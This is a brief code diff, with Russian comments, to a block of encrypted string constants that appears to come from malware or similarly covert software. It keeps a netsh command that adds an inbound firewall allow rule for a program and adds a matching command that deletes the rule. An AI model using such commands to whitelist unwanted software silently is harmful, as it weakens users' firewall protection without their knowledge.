@@ -249,8 +249,8 @@ CSSTR TinyOldDocs[] = "tiny_olddocs.dat"; //имя файла для хранения данных по скр
 
 //команда для добавления в список доверенных браундмаузера
 CSSTR NetshFirewallWinXp[] = "netsh firewall add allowedprogram \"%s\" %s ENABLE"; //для windows XP
-CSSTR NetshFirewallWin7[] = "netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow program=\"%s\""; //для windows 7
-
+CSSTR NetshFirewallWin7Add[] = "netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow program=\"%s\""; //для windows 7
+CSSTR NetshFirewallWin7Del[] = "netsh advfirewall firewall delete rule \"%s\"";
 //=============================================================================
 // Конец блока шифрованных строк
 //=============================================================================
